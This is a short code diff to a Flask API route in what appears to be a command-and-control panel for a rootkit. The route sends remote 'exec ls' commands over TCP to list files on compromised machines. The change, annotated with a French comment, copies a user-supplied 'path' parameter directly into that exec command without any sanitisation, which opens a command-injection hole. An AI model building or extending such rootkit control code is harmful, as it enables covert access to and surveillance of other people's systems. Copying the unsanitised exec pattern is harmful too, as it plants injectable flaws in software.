@@ -206,8 +206,13 @@ def api_list_remote_files():
     if not cfg.rootkit_connexion or not cfg.rootkit_connexion.is_authenticated():
         return jsonify({"error": "Not connected to any rootkit"}), 403
 
+    path = request.args.get("path", "/").strip()
+    if not path:
+        path = "/"
+
     try:
-        result = cfg.rootkit_connexion.send("exec ls -pA1", use_history=False, channel="tcp")
+        # ✅ ici : inclure le path dans la commande exec ls
+        result = cfg.rootkit_connexion.send(f"exec ls -pA1 {path}", use_history=False, channel="tcp")
 
         if not result or "stdout:" not in result:
             return jsonify({"error": f"No valid response: {result}"}), 500
